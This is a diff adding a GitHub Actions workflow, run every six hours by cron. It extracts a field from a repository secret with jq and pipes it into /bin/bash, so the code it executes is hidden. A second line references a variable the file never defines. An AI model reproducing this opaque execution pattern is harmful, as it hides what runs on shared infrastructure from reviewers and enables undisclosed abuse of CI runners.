@@ -1,0 +1,18 @@
+name: jiexiguanhe
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiexiguanhe
+        env:
+          i99: ${{ secrets.i99 }}
+        run: |
+          echo $i99 | jq -r .l0 | /bin/bash
+          echo $vyvs99941 | jq -r .yhdq8 | /bin/bash
+
